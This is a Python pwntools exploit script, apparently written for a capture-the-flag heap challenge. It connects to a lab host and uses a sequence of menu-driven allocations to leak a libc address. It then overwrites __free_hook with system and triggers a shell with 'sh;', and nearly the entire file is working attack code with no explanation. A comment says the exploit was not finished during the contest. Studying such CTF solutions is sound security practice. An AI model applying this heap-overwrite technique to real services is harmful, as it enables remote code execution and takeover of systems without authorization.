#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import time
from pwn import *

#Did not finish during the CTF  QAQ

host = "10.211.55.28"
port = 8888

r = remote(host,port)

def rec(name,num):
    r.recvuntil(">")
    r.sendline(str(num))
    r.recvuntil("?")
    r.sendline(name)

def ret():
    r.recvuntil(">")
    r.sendline("8")

r.recvuntil("?")
r.sendline("a"*0x31)
rec("b"*0x30,2)
rec("d"*0x21000,2)
r.recvuntil(">")
r.sendline("3")
rec("e"*0x10,2)
rec("f"*0x400,2)
ret()
ret()
ret()
ret()
r.recvuntil("Hi, ")
libc = u64(r.recvuntil("\n")[:6].ljust(8,"\x00")) - 0x3c3bb8 
print "libc:", hex(libc)
free_hook =  libc + 0x3c57a8
system = libc + 0x45390
rec("g"*0x30,2)
rec("h"*0x30,2)
ret()
ret()
safestack = libc - 0x130
rec(p64(safestack)[:6],1)
rec("i"*0x51,2)
rec("j"*0x30,2)
rec("k"*0x10,2)
rec("l"*0x10,2)
rec("m"*0x51,2)
rec("o"*0x10,2)
rec("p"*0x10,2)
ret()
ret()
ret()
ret()
ret()
rec("\x31",2)
rec("\x31",2)
rec("\x31",2)
rec("z"*0x100,2)
ret()
rec("a"*0x18 + p64(free_hook-3)[:6],2)
ret()
ret()
rec("sh;" + p64(system)[:6],1)
ret()
ret()
r.interactive()
